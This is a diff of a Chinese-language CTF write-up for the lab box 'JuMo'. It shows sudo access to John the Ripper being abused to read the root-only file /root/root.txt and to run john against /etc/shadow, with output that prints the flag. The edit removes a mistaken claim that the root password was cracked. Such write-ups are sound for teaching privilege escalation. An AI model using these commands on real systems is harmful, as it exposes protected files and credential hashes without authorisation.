@@ -116,7 +116,7 @@ User welcome may run the following commands on JuMo:
 
 ### 方法一：直接读取可能的 Flag 文件 (我的方法)
 
-我已知 /root/root.txt 包含了 flag。虽然 john 的 --wordlist 选项通常用于指定密码字典，但配合 --stdout 选项，john 会将 wordlist 的内容（或生成的候选密码）打印到标准输出。利用 sudo 权限，这可以用来读取 root 权限才能访问的文件内容。
+已知 /root/root.txt 包含了 flag。虽然 john 的 --wordlist 选项通常用于指定密码字典，但配合 --stdout 选项，john 会将 wordlist 的内容（或生成的候选密码）打印到标准输出。利用 sudo 权限，这可以用来读取 root 权限才能访问的文件内容。
 
 ```bash
 welcome@JuMo:~$ sudo /usr/sbin/john --wordlist=/root/root.txt --stdout
@@ -127,19 +127,15 @@ flag{521ca933d6e159a50c2c04e7daa930f6}  #<-- 读取并输出了 /root/root.txt �
 
 此命令成功读取了 /root/root.txt 文件，内容即为 flag。
 
-### 方法二：破解 Root 密码 (ta0神的方法)
-
-更常见的利用 john 进行提权的方式是破解 /etc/shadow 文件中的密码哈希。这里假设 /root/root.txt 文件恰好包含了 root 用户的密码（或者可以直接作为字典）。
+### 方法二：读取可能的 Flag 文件 (ta0神的方法)
 
 ```bash
 welcome@JuMo:~$ sudo /usr/sbin/john /etc/shadow --wordlist=/root/root.txt
 Loaded 2 password hashes with 2 different salts (crypt, generic crypt(3) [?/64])
 Press 'q' or Ctrl-C to abort, almost any other key for status
-0g 0:00:00:00 100% 0g/s 100.0p/s 200.0c/s 200.0C/s flag{521ca933d6e159a50c2c04e7daa930f6} #<-- 破解出的 root 密码
+0g 0:00:00:00 100% 0g/s 100.0p/s 200.0c/s 200.0C/s flag{521ca933d6e159a50c2c04e7daa930f6} 
 Session completed
 ```
-
-john 成功利用 /root/root.txt 的内容（即 flag）作为字典，破解了 /etc/shadow 文件中的 root 用户密码哈希。破解得到的 root 密码正是 flag{521ca933d6e159a50c2c04e7daa930f6}。
 
 ## 4.3. 获取 Root 权限
 
